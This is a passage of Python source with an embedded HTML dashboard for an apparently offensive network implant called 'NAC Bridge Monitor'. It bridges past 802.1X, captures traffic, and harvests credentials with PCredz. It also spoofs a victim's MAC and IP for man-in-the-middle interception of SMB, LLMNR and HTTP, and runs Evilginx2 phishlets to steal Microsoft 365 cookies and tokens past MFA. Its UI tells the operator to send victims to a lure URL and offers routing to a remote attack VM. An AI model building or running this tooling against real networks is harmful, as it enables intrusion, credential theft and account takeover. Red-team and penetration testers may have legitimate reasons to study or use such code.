                preexec_fn=os.setpgrp
            )

            time.sleep(2)

            # Verify
            if self.tcpdump_process.poll() is not None:
                stderr = self.tcpdump_process.stderr.read().decode()
                log(f"tcpdump failed: {stderr}", 'ERROR')
                return False

            with open(CONFIG['PIDFILE'], 'w') as f:
                f.write(str(self.tcpdump_process.pid))

            self.start_time = datetime.now().isoformat()
            self.stop_monitoring = False

            log(f"✓ tcpdump started (PID: {self.tcpdump_process.pid})", 'SUCCESS')

            # Start monitoring
            self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
            self.monitor_thread.start()

            self._save_state()
            log("=== Capture Started ===", 'SUCCESS')
            return True

        except Exception as e:
            log(f"Capture start failed: {e}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return False

    def _monitor_loop(self):
        """Monitor PCAP size and analyze"""
        last_analysis = time.time()

        while not self.stop_monitoring:
            try:
                if not self.tcpdump_process or self.tcpdump_process.poll() is not None:
                    break

                if self.pcap_file and os.path.exists(self.pcap_file):
                    if self.analysis_interval and time.time() - last_analysis >= self.analysis_interval:
                        log("Running periodic analysis...")
                        threading.Thread(
                            target=self.loot_analyzer.analyze_pcap,
                            args=(self.pcap_file,),
                            daemon=True
                        ).start()
                        last_analysis = time.time()

                time.sleep(5)

            except Exception as e:
                log(f"Monitor loop error: {e}", 'ERROR')
                time.sleep(5)

    def delete_pcap(self):
        """Delete the current capture (requires capture to be stopped)"""
        if self.tcpdump_process and self.tcpdump_process.poll() is None:
            log("Cannot delete PCAP while capture is running", 'WARNING')
            return False, 'Capture is still running'

        if not self.pcap_file:
            log("No PCAP file to delete", 'WARNING')
            return False, 'No PCAP file to delete'

        try:
            if os.path.exists(self.pcap_file):
                os.remove(self.pcap_file)
                log(f"Deleted PCAP file {self.pcap_file}")
            else:
                log("PCAP path does not exist on disk", 'WARNING')
                return False, 'PCAP file not found'
        except Exception as e:
            log(f"Failed to delete PCAP: {e}", 'ERROR')
            return False, str(e)

        self.pcap_file = None
        self._save_state()
        return True, None

    def stop_capture(self):
        """Stop capture (keep bridge running)"""
        log("Stopping capture...")
        self.stop_monitoring = True

        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)

        try:
            if self.tcpdump_process:
                self.tcpdump_process.terminate()
                try:
                    self.tcpdump_process.wait(timeout=5)
                except Exception:
                    self.tcpdump_process.kill()
                self.tcpdump_process = None

            if self.pcap_file and os.path.exists(self.pcap_file):
                log("Running final analysis...")
                self.loot_analyzer.analyze_pcap(self.pcap_file)

            if os.path.exists(CONFIG['PIDFILE']):
                os.remove(CONFIG['PIDFILE'])

            self.start_time = None
            log("Capture stopped (bridge remains active)", 'SUCCESS')
            return True

        except Exception as e:
            log(f"Stop failed: {e}", 'ERROR')
            return False

    def _force_cleanup_bridge(self):
        """Force cleanup bridge"""
        bridge = CONFIG['BRIDGE_NAME']
        run_cmd(['ip', 'link', 'set', bridge, 'down'])
        run_cmd(['ip', 'link', 'delete', bridge])

        for iface in self.interfaces:
            run_cmd(['ip', 'link', 'set', iface, 'nomaster'])

    def get_status(self):
        """Get current status"""
        status = {
            'status': 'inactive',
            'bridge': None,
            'bridge_active': self.bridge_initialized,
            'interfaces': [],
            'pcap_file': None,
            'pcap_size': 0,
            'packet_count': 0,
            'pid': None,
            'start_time': None,
            'client_ip': self.client_ip,
            'gateway_ip': self.gateway_ip,
            'logs': self._get_logs(),
            'mitm': self.mitm_manager.get_status(),
            'evilginx': self.evilginx_manager.get_status()
        }

        if self.tcpdump_process and self.tcpdump_process.poll() is None:
            status['status'] = 'active'
            status['pid'] = self.tcpdump_process.pid
            status['pcap_file'] = self.pcap_file
            status['start_time'] = self.start_time
            status['bridge'] = CONFIG['BRIDGE_NAME']

            # Update IPs
            self._detect_network_ips()
            status['client_ip'] = self.client_ip
            status['gateway_ip'] = self.gateway_ip

            if self.pcap_file and os.path.exists(self.pcap_file):
                status['pcap_size'] = os.path.getsize(self.pcap_file)
                # Use capinfos if available for faster packet counting, otherwise skip
                result = run_cmd(['capinfos', '-c', self.pcap_file], timeout=2)
                if result and result.returncode == 0 and result.stdout:
                    # capinfos outputs: Number of packets: 1234
                    match = re.search(r'Number of packets:\s*(\d+)', result.stdout)
                    if match:
                        status['packet_count'] = int(match.group(1))
                    else:
                        status['packet_count'] = 0
                else:
                    # Skip counting if capinfos not available (too slow with tcpdump)
                    status['packet_count'] = 0
        else:
            if self.pcap_file and os.path.exists(self.pcap_file):
                status['pcap_file'] = self.pcap_file
                status['pcap_size'] = os.path.getsize(self.pcap_file)

        status['interfaces'] = self._get_interfaces()
        return status

    def _detect_network_ips(self):
        """Best-effort detection of client and gateway IPs."""
        try:
            gateway_ip = None
            route = run_cmd(['ip', '-4', 'route', 'show', 'default'])
            if route and route.returncode == 0:
                match = re.search(r'default via (\S+)', route.stdout)
                if match:
                    gateway_ip = match.group(1)

            client_ip = None
            if self.interfaces:
                neigh = run_cmd(['ip', '-4', 'neigh', 'show'])
                if neigh and neigh.returncode == 0:
                    for line in neigh.stdout.splitlines():
                        parts = line.split()
                        if not parts or 'FAILED' in parts or 'dev' not in parts:
                            continue
                        dev = parts[parts.index('dev') + 1]
                        if dev == self.interfaces[0]:
                            client_ip = parts[0]
                            break

            if client_ip:
                self.client_ip = client_ip
            if gateway_ip:
                self.gateway_ip = gateway_ip
        except Exception as e:
            log(f"Failed to detect network IPs: {e}", 'WARNING')

    def _save_state(self):
        """Save state"""
        try:
            with open(CONFIG['STATEFILE'], 'w') as f:
                if self.interfaces:
                    f.write(f'CLIENT_INT="{self.interfaces[0]}"\n')
                    f.write(f'SWITCH_INT="{self.interfaces[1]}"\n')
                f.write(f'BRIDGE_NAME="{CONFIG["BRIDGE_NAME"]}"\n')
                if self.pcap_file:
                    f.write(f'PCAP_FILE="{self.pcap_file}"\n')
                if self.start_time:
                    f.write(f'START_TIME="{self.start_time}"\n')
        except Exception:
            pass

    def _get_interfaces(self):
        """Get all network interfaces"""
        interfaces = []
        result = run_cmd(['ip', '-j', 'link', 'show'])
        if not result:
            return interfaces

        try:
            for iface in json.loads(result.stdout):
                name = iface.get('ifname', '')
                if name.startswith(('lo', 'docker', 'veth', 'virbr')):
                    continue

                state = 'UP' if 'UP' in iface.get('flags', []) else 'DOWN'
                mac = iface.get('address', 'N/A')

                role = 'Unknown'
                if is_mgmt_interface(name):
                    role = 'Management (WiFi)'
                elif self.interfaces and name in self.interfaces:
                    idx = self.interfaces.index(name)
                    role = f'Tap Port ({"Client" if idx == 0 else "Switch"})'
                elif name == CONFIG['BRIDGE_NAME']:
                    role = 'Transparent Bridge'
                elif name.startswith(('eth', 'enp', 'lan', 'end')):
                    role = 'Ethernet'

                interfaces.append({
                    'name': name,
                    'state': state,
                    'mac': mac,
                    'role': role
                })
        except Exception:
            pass

        return interfaces

    def _get_logs(self, lines=10):
        """Get recent logs - optimized to read only last N lines"""
        try:
            if os.path.exists(CONFIG['LOGFILE']):
                # Use efficient tail reading for large log files
                result = run_cmd(['tail', '-n', str(lines), CONFIG['LOGFILE']], timeout=1)
                if result and result.stdout:
                    return [line.strip() for line in result.stdout.strip().split('\n') if line.strip()]
                # Fallback if tail fails
                with open(CONFIG['LOGFILE'], 'r') as f:
                    return [line.strip() for line in f.readlines()[-lines:] if line.strip()]
        except Exception:
            pass
        return []

# ============================================================================
# WEB SERVER
# ============================================================================

class NACWebHandler(BaseHTTPRequestHandler):
    bridge_manager = None

    def log_message(self, format, *args):
        pass

    def _send_json(self, data, status=200):
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def _send_html(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(get_html_template().encode('utf-8'))

    def do_GET(self):
        path = urlparse(self.path).path

        if path in ['/', '/index.html']:
            self._send_html()
        elif path == '/api/status':
            self._send_json(self.bridge_manager.get_status())
        elif path == '/api/loot':
            self._send_json(self.bridge_manager.loot_analyzer.get_loot_summary())
        elif path == '/api/loot/export':
            raw_output = self.bridge_manager.loot_analyzer.raw_output
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Disposition',
                             'attachment; filename="pcredz_output.txt"')
            self.end_headers()
            self.wfile.write(raw_output.encode('utf-8'))
        elif path == '/api/download':
            query = parse_qs(urlparse(self.path).query)
            pcap_file = query.get('file', [None])[0]
            if pcap_file and os.path.exists(pcap_file):
                try:
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/vnd.tcpdump.pcap')
                    self.send_header('Content-Disposition',
                                     f'attachment; filename="{os.path.basename(pcap_file)}"')
                    self.end_headers()
                    with open(pcap_file, 'rb') as f:
                        self.wfile.write(f.read())
                except Exception:
                    self.send_error(500)
            else:
                self.send_error(404)
        
        # Test page for debugging
        elif path == '/test':
            try:
                # Get script directory dynamically
                script_dir = os.path.dirname(os.path.abspath(__file__))
                test_file_path = os.path.join(script_dir, 'test-webui.html')
                
                if os.path.exists(test_file_path):
                    with open(test_file_path, 'r', encoding='utf-8') as f:
                        test_html = f.read()
                    log(f"Serving test page from: {test_file_path}")
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(test_html.encode('utf-8'))
                else:
                    log(f"Test page not found at: {test_file_path}", 'ERROR')
                    self.send_error(404, f"Test page not found at: {test_file_path}")
            except Exception as e:
                log(f"Test page error: {e}", 'ERROR')
                self.send_error(404, f"Test page error: {e}")
        
        else:
            self.send_error(404)

    def do_POST(self):
        path = urlparse(self.path).path

        if path == '/api/start':
            with capture_lock:
                success = self.bridge_manager.start_capture()
            self._send_json({'success': success})
            
        elif path == '/api/stop':
            with capture_lock:
                success = self.bridge_manager.stop_capture()
            self._send_json({'success': success})
            
        elif path == '/api/analyze':
            # Manual PCredz analysis
            pcap_file = self.bridge_manager.pcap_file
            if pcap_file and os.path.exists(pcap_file):
                result = self.bridge_manager.loot_analyzer.analyze_pcap(pcap_file)
                self._send_json(result)
            else:
                self._send_json({'success': False, 'error': 'No PCAP file available'})
                
        elif path == '/api/delete_pcap':
            with capture_lock:
                success, error = self.bridge_manager.delete_pcap()
            response = {'success': success}
            if error:
                response['error'] = error
            self._send_json(response)
            
        elif path == '/api/loot/clear':
            self.bridge_manager.loot_analyzer.clear_loot()
            self._send_json({'success': True})
            
        # MITM endpoints
        elif path == '/api/mitm/enable':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                
                mitm = self.bridge_manager.mitm_manager
                bridge = CONFIG['BRIDGE_NAME']
                
                # Setup bridge IP
                if not mitm.setup_bridge_ip(bridge):
                    self._send_json({'success': False, 'error': 'Failed to assign bridge IP'})
                    return
                
                # Learn victim
                if not mitm.learn_victim(bridge, timeout=30):
                    self._send_json({'success': False, 'error': 'Failed to learn victim identity'})
                    return
                
                # Setup NAT
                switch_iface = self.bridge_manager.interfaces[1]
                if not mitm.setup_nat_rules(bridge, switch_iface):
                    self._send_json({'success': False, 'error': 'Failed to setup NAT'})
                    return
                
                # Setup remote routing if requested
                remote_ip = data.get('remote_ip')
                if remote_ip:
                    mitm.setup_remote_routing(remote_ip)
                
                mitm.enabled = True
                CONFIG['MITM_ENABLED'] = True
                self._send_json({'success': True})
                
            except Exception as e:
                log(f"MITM enable failed: {e}", 'ERROR')
                self._send_json({'success': False, 'error': str(e)})
                
        elif path == '/api/mitm/disable':
            self.bridge_manager.mitm_manager.cleanup()
            self._send_json({'success': True})
            
        elif path == '/api/mitm/intercept':
            try:
                content_length = int(self.headers['Content-Length'])
                body = self.rfile.read(content_length)
                data = json.loads(body)
                
                category = data.get('category')
                destination = data.get('destination', 'local')
                
                if category not in INTERCEPT_PROTOCOLS:
                    self._send_json({'success': False, 'error': 'Invalid category'})
                    return
                
                mitm = self.bridge_manager.mitm_manager
                success_count = 0
                
                for proto_name, port, protos in INTERCEPT_PROTOCOLS[category]:
                    if mitm.add_intercept_rule(proto_name, port, protos, destination):
                        success_count += 1
                
                self._send_json({
                    'success': success_count > 0,
                    'rules_added': success_count
                })
                
            except Exception as e:
                self._send_json({'success': False, 'error': str(e)})
                
        elif path == '/api/mitm/clear_rules':
            self.bridge_manager.mitm_manager.remove_all_intercept_rules()
            self._send_json({'success': True})
            
        # Evilginx endpoints
        elif path == '/api/evilginx/start':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                
                phishlet = data.get('phishlet', 'o365')
                domain = data.get('domain')
                
                evilginx = self.bridge_manager.evilginx_manager
                success = evilginx.start(phishlet=phishlet, domain=domain)
                
                if success:
                    self._send_json({'success': True, 'lure_url': evilginx.lure_url})
                else:
                    self._send_json({'success': False, 'error': 'Failed to start Evilginx2'})
                    
            except Exception as e:
                log(f"Evilginx start failed: {e}", 'ERROR')
                self._send_json({'success': False, 'error': str(e)})
                
        elif path == '/api/evilginx/stop':
            success = self.bridge_manager.evilginx_manager.stop()
            self._send_json({'success': success})
            
        elif path == '/api/evilginx/sessions':
            self._send_json(self.bridge_manager.evilginx_manager.get_status())
            
        elif path == '/api/evilginx/clear_sessions':
            self.bridge_manager.evilginx_manager.clear_sessions()
            self._send_json({'success': True})
            
        elif path == '/api/evilginx/install':
            try:
                log("Received Evilginx installation request")
                result = self.bridge_manager.evilginx_manager.install()
                self._send_json(result)
            except Exception as e:
                log(f"Installation endpoint error: {e}", 'ERROR')
                self._send_json({'success': False, 'error': str(e)})
        
        else:
            self.send_error(404)

# ============================================================================
# HTML TEMPLATE
# ============================================================================

def get_html_template():
    """Return complete HTML template"""
    return '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NAC Bridge Monitor - Transparent Tap</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;color:#333}
.container{max-width:1400px;margin:0 auto}
.header{text-align:center;color:#fff;margin-bottom:30px}
.header h1{font-size:2.5em;margin-bottom:5px;text-shadow:2px 2px 4px rgba(0,0,0,.3)}
.header p{font-size:1em;opacity:.9}
.dashboard{background:#fff;border-radius:15px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
.info-banner{background:#e3f2fd;border-left:4px solid #2196f3;padding:15px;margin-bottom:20px;border-radius:5px}
.info-banner h3{color:#1976d2;margin-bottom:5px}
.info-banner p{color:#555;font-size:.9em}
.tab-nav{display:flex;gap:10px;margin-bottom:25px;border-bottom:2px solid #e0e0e0}
.tab-btn{padding:12px 24px;border:none;background:transparent;cursor:pointer;font-weight:600;color:#666;border-bottom:3px solid transparent;transition:all .3s}
.tab-btn:hover{color:#667eea}
.tab-btn.active{color:#667eea;border-bottom-color:#667eea}
.badge{display:inline-block;background:#dc3545;color:#fff;border-radius:12px;padding:2px 8px;font-size:.75em;margin-left:5px;min-width:20px;text-align:center}
.tab-content{display:none}
.tab-content.active{display:block}
.status-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:15px;border-bottom:2px solid #f0f0f0}
.status-badge{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;border-radius:20px;font-weight:600;font-size:.9em}
.status-badge.active{background:#d4edda;color:#155724}
.status-badge.inactive{background:#f8d7da;color:#721c24}
.status-indicator{width:12px;height:12px;border-radius:50%}
.status-indicator.active{background:#28a745;animation:pulse 2s infinite}
.status-indicator.inactive{background:#dc3545}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;margin-bottom:30px}
.card{background:#f8f9fa;border-radius:10px;padding:20px;border-left:4px solid #667eea}
.card-title{font-size:.9em;color:#666;margin-bottom:10px;text-transform:uppercase}
.card-value{font-size:1.8em;font-weight:700;color:#333}
.card-detail{font-size:.85em;color:#888;margin-top:5px}
.interface-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:15px;margin-top:15px}
.interface-card{background:#fff;border:2px solid #e0e0e0;border-radius:8px;padding:15px;transition:all .3s}
.interface-card:hover{border-color:#667eea;box-shadow:0 4px 12px rgba(102,126,234,0.2)}
.interface-header{display:flex;justify-content:space-between;margin-bottom:12px}
.interface-name{font-weight:700;font-size:1.1em;color:#667eea}
.interface-status{padding:4px 10px;border-radius:12px;font-size:.75em;font-weight:600}
.interface-status.up{background:#d4edda;color:#155724}
.interface-status.down{background:#f8d7da;color:#721c24}
.interface-detail{display:flex;justify-content:space-between;padding:6px 0;font-size:.9em;border-bottom:1px solid #f0f0f0}
.button-group{display:flex;gap:15px;flex-wrap:wrap;margin-top:20px}
.btn{flex:1;min-width:180px;padding:15px 30px;border:none;border-radius:8px;font-size:1em;font-weight:600;cursor:pointer;transition:all .3s;color:#fff}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn-start{background:#28a745}
.btn-start:hover:not(:disabled){background:#218838}
.btn-stop{background:#dc3545}
.btn-stop:hover:not(:disabled){background:#c82333}
.btn-refresh{background:#667eea}
.btn-refresh:hover:not(:disabled){background:#5568d3}
.btn-download{background:#17a2b8}
.btn-download:hover:not(:disabled){background:#138496}
.btn-danger{background:#dc3545}
.btn-danger:hover:not(:disabled){background:#c82333}
.info-box{background:#fff3cd;border-left:4px solid #ffc107;padding:15px;margin:15px 0;border-radius:5px}
.info-box h4{color:#856404;margin-bottom:8px}
.info-box p{color:#856404;font-size:.9em;margin:5px 0}
input[type="text"]{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:15px}
input[type="text"]:focus{outline:none;border-color:#667eea}
.rule-item{background:#f8f9fa;border-left:4px solid #28a745;padding:15px;margin:10px 0;border-radius:8px;display:flex;justify-content:space-between;align-items:center}
.rule-info{font-family:monospace;font-size:.9em}
.alert{padding:15px;border-radius:8px;margin-bottom:20px;display:none}
.alert.show{display:block}
.alert-success{background:#d4edda;color:#155724}
.alert-error{background:#f8d7da;color:#721c24}
.alert-info{background:#d1ecf1;color:#0c5460}
.capture-info{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border-radius:10px;padding:25px;margin-bottom:20px;display:none}
.capture-info.active{display:block}
.capture-detail{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.2)}
.logs-section{background:#1e1e1e;color:#0f0;border-radius:8px;padding:20px;margin-top:20px;font-family:monospace;font-size:.85em;max-height:300px;overflow-y:auto}
.loot-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin:20px 0}
.stat-card{background:#f8f9fa;border-radius:10px;padding:20px;text-align:center;border-left:4px solid #dc3545}
.stat-value{font-size:2.5em;font-weight:700;color:#333;margin-bottom:5px}
.stat-label{font-size:.9em;color:#666;text-transform:uppercase}
.loot-filters{display:flex;gap:10px;flex-wrap:wrap;margin:20px 0}
.filter-btn{padding:8px 16px;border:2px solid #e0e0e0;background:#fff;border-radius:20px;cursor:pointer;font-weight:600;color:#666;transition:all .3s}
.filter-btn:hover{border-color:#667eea;color:#667eea}
.filter-btn.active{background:#667eea;color:#fff;border-color:#667eea}
.loot-items{display:flex;flex-direction:column;gap:10px;margin:20px 0;max-height:500px;overflow-y:auto}
.loot-item{background:#fff;border:1px solid #e0e0e0;border-left:4px solid #dc3545;border-radius:8px;padding:15px;transition:all .3s}
.loot-item:hover{box-shadow:0 4px 12px rgba(0,0,0,.1);transform:translateX(5px)}
.loot-item.http{border-left-color:#28a745}
.loot-item.ftp{border-left-color:#17a2b8}
.loot-item.smtp{border-left-color:#ffc107}
.loot-item.ntlm{border-left-color:#dc3545}
.loot-item.imap{border-left-color:#6f42c1}
.loot-header{display:flex;justify-content:space-between;margin-bottom:10px}
.loot-protocol{font-weight:700;color:#667eea;font-size:1.1em}
.loot-timestamp{font-size:.85em;color:#999}
.loot-content{font-family:monospace;font-size:.9em;background:#f8f9fa;padding:10px;border-radius:5px;margin-top:10px}
.loot-field{padding:5px 0}
.loot-field strong{color:#333}
.empty-state{text-align:center;padding:60px 20px;color:#999}
.empty-state-icon{font-size:4em;margin-bottom:20px;opacity:.5}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>NAC Bridge Monitor</h1>
<p>Transparent Bridge + MITM Interception</p>
</div>
<div class="dashboard">
<div class="info-banner">
<h3>[i] Transparent Mode Active</h3>
<p>Bridge operates at Layer 2 only. Client 802.1X authentication passes through transparently. No stealth mode - bridge is always active for seamless operation.</p>
</div>
<div id="alert" class="alert"></div>
<div class="tab-nav">
<button class="tab-btn active" onclick="switchTab('status')">Status</button>
<button class="tab-btn" onclick="switchTab('mitm')">MITM</button>
<button class="tab-btn" onclick="switchTab('evilginx')">Evilginx <span id="evilginxBadge" class="badge">0</span></button>
<button class="tab-btn" onclick="switchTab('loot')">Loot <span id="lootBadge" class="badge">0</span></button>
</div>
<div id="statusTab" class="tab-content active">
<div class="status-header">
<h2>Capture Status</h2>
<div id="statusBadge" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>
<div class="grid">
<div class="card">
<div class="card-title">Capture Size</div>
<div class="card-value" id="captureSize">0 MB</div>
<div class="card-detail" id="capturePackets">0 packets</div>
</div>
<div class="card">
<div class="card-title">Duration</div>
<div class="card-value" id="captureDuration">00:00:00</div>
<div class="card-detail">Elapsed time</div>
</div>
</div>
<div id="captureInfo" class="capture-info">
<h3>Active Capture</h3>
<div class="capture-detail">
<span>File:</span>
<span id="captureFile" style="font-family:monospace">-</span>
</div>
<div class="capture-detail">
<span>Bridge:</span>
<span id="bridgeName">br0</span>
</div>
<div class="capture-detail">
<span>PID:</span>
<span id="capturePid">-</span>
</div>
</div>
<h2 style="margin-bottom:15px;color:#667eea">Network Topology</h2>
<div id="interfaces" class="interface-grid"></div>
<div class="button-group">
<button id="btnStart" class="btn btn-start">Start Capture</button>
<button id="btnStop" class="btn btn-stop" disabled>Stop Capture</button>
<button id="btnPcapSize" class="btn btn-refresh" disabled>PCAP Size: 0 MB</button>
<button id="btnDownload" class="btn btn-download" disabled>Download PCAP</button>
<button id="btnDelete" class="btn btn-danger" disabled>Delete PCAP</button>
<button class="btn btn-refresh" onclick="fetchStatus()">Refresh</button>
</div>
<div class="logs-section">
<h3 style="color:#fff;margin-bottom:10px">Recent Logs</h3>
<div id="logs"></div>
</div>
</div>

<!-- MITM TAB -->
<div id="mitmTab" class="tab-content">
<div class="status-header">
<h2>MITM Control</h2>
<div id="mitmBadge" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>

<div class="info-box">
<h4>WARNING: MITM Mode</h4>
<p>Enables active traffic interception. Bridge learns victim MAC/IP and spoofs all attacker traffic.</p>
<p><strong>Warning:</strong> This makes the device detectable. Use carefully.</p>
</div>

<div id="victimInfo" style="display:none;background:#e7f3ff;padding:20px;border-radius:8px;margin:15px 0">
<h3 style="color:#0066cc;margin-bottom:15px">Target Device</h3>
<p style="margin:8px 0"><strong>MAC:</strong> <code id="victimMac" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>IP:</strong> <code id="victimIP" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>Gateway MAC:</strong> <code id="gatewayMac" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>Bridge IP:</strong> <code id="bridgeIP" style="background:#fff;padding:4px 8px;border-radius:4px">10.200.66.1</code></p>
</div>

<h3 style="margin:20px 0 15px 0">Remote Attacker (Optional)</h3>
<p style="margin-bottom:15px;color:#666">Route intercepted traffic to external attack VM over WiFi (e.g., Kali at 172.31.250.100)</p>
<input type="text" id="remoteIP" placeholder="Remote VM IP (e.g., 172.31.250.100)">

<div class="button-group">
<button id="btnEnableMITM" class="btn btn-danger" onclick="enableMITM()">Enable MITM</button>
<button id="btnDisableMITM" class="btn btn-stop" onclick="disableMITM()" disabled>Disable MITM</button>
</div>

<h3 style="margin:25px 0 15px 0">Protocol Interception</h3>
<p style="margin-bottom:15px;color:#666">Intercept specific protocols and redirect to bridge IP or remote attacker</p>

<div class="grid" style="margin-bottom:20px">
<div class="card" style="border-left-color:#dc3545;cursor:pointer" onclick="interceptCategory('smb')">
<div class="card-title">SMB/NetBIOS</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Ports 137,138,139,445</div>
<div style="margin-top:10px;font-size:.85em;color:#dc3545;font-weight:600">Click to Intercept</div>
</div>
<div class="card" style="border-left-color:#ffc107;cursor:pointer" onclick="interceptCategory('name_resolution')">
<div class="card-title">Name Resolution</div>
<div style="font-size:.9em;color:#666;margin-top:8px">LLMNR, mDNS</div>
<div style="margin-top:10px;font-size:.85em;color:#ffc107;font-weight:600">Click to Intercept</div>
</div>
<div class="card" style="border-left-color:#17a2b8;cursor:pointer" onclick="interceptCategory('http')">
<div class="card-title">HTTP</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Port 80</div>
<div style="margin-top:10px;font-size:.85em;color:#17a2b8;font-weight:600">Click to Intercept</div>
</div>
</div>

<h3 style="margin:20px 0 15px 0">Active Intercept Rules</h3>
<div id="activeRules"></div>
<button class="btn btn-danger" onclick="clearRules()" style="margin-top:15px">Clear All Rules</button>
</div>

<!-- EVILGINX TAB -->
<div id="evilginxTab" class="tab-content">
<div class="status-header">
<h2>Evilginx2 - Microsoft Cookie Capture</h2>
<div id="evilginxBadge2" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>

<div class="info-box">
<h4>Evilginx2 - OAuth Token & Cookie Harvester</h4>
<p>Captures Microsoft 365 authentication tokens and session cookies, including MFA bypass.</p>
<p><strong>Setup:</strong> DNS must point victim to this device, or use local DNS poisoning.</p>
</div>

<div id="evilginxNotInstalled" style="display:none;background:#ffe7e7;padding:20px;border-radius:8px;margin:15px 0;border-left:4px solid #e74c3c">
<h3 style="color:#e74c3c;margin-bottom:15px">WARNING: Evilginx2 Not Installed</h3>
<p style="margin-bottom:15px">Evilginx2 is required for OAuth token and cookie capture.</p>
<button class="btn btn-start" onclick="installEvilginx()" style="margin-top:10px">Install Evilginx2 Now</button>
<p style="margin-top:15px;font-size:.9em;color:#999">Installation takes 5-10 minutes (includes Go compiler build)</p>
</div>

<div id="evilginxInfo" style="display:none;background:#e7f3ff;padding:20px;border-radius:8px;margin:15px 0">
<h3 style="color:#0066cc;margin-bottom:15px">Active Phishing</h3>
<p style="margin:8px 0"><strong>Phishlet:</strong> <code id="evilginxPhishlet" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>Lure URL:</strong> <code id="evilginxLure" style="background:#fff;padding:4px 8px;border-radius:4px;font-size:.85em">-</code></p>
<p style="margin:8px 0"><strong>Bridge IP:</strong> <code style="background:#fff;padding:4px 8px;border-radius:4px">10.200.66.1</code></p>
<p style="margin-top:15px;font-size:.9em;color:#0066cc">Send victims to the lure URL. Captured sessions appear below.</p>
</div>

<h3 style="margin:20px 0 15px 0">Microsoft Phishlet Selection</h3>
<div class="grid" style="margin-bottom:20px">
<div class="card" style="border-left-color:#0078d4">
<div class="card-title">Microsoft 365</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Outlook, SharePoint, Teams, OneDrive</div>
<div style="margin-top:10px;font-size:.85em;color:#0078d4">Phishlet: o365</div>
</div>
<div class="card" style="border-left-color:#0072c6">
<div class="card-title">Outlook.com</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Personal Outlook accounts</div>
<div style="margin-top:10px;font-size:.85em;color:#0072c6">Phishlet: outlook</div>
</div>
</div>

<h3 style="margin:20px 0 15px 0">Domain Configuration (Optional)</h3>
<p style="margin-bottom:15px;color:#666">Leave empty for default (o365.local) or enter custom domain</p>
<input type="text" id="evilginxDomain" placeholder="e.g., login-microsoft.com">

<div class="button-group">
<button id="btnStartO365" class="btn btn-start" onclick="startEvilginx('o365')">Start O365</button>
<button id="btnStartOutlook" class="btn btn-start" onclick="startEvilginx('outlook')">Start Outlook</button>
<button id="btnStopEvilginx" class="btn btn-stop" onclick="stopEvilginx()" disabled>Stop Evilginx</button>
</div>

<h3 style="margin:25px 0 15px 0">Captured Sessions</h3>
<div id="evilginxSessions" class="logs-section" style="max-height:500px">
<div style="color:#999;text-align:center;padding:40px">
<div style="font-size:3em;margin-bottom:15px">[ ]</div>
<p>No sessions captured yet</p>
<p style="margin-top:10px;font-size:.9em">Start Evilginx and send victims to lure URL</p>
</div>
</div>

<div class="button-group" style="margin-top:20px">
<button class="btn btn-refresh" onclick="fetchStatus()">Refresh Sessions</button>
<button class="btn btn-download" onclick="exportSessions()">Export Sessions (JSON)</button>
<button class="btn btn-danger" onclick="clearSessions()">Clear All Sessions</button>
</div>
</div>

<div id="lootTab" class="tab-content">
<h2 style="margin-bottom:20px;color:#667eea">PCredz Analysis Output</h2>
<div class="button-group" style="margin-bottom:20px">
<button onclick="analyzeNow()" id="btnAnalyze" class="btn btn-start">Analyze PCAP Now</button>
<button onclick="exportLoot()" class="btn btn-download">Export Output (TXT)</button>
<button onclick="clearLoot()" class="btn btn-danger">Clear Output</button>
</div>
<div id="lootOutput" class="logs-section" style="max-height:600px;white-space:pre-wrap;word-wrap:break-word">
<div style="color:#999;text-align:center;padding:40px">
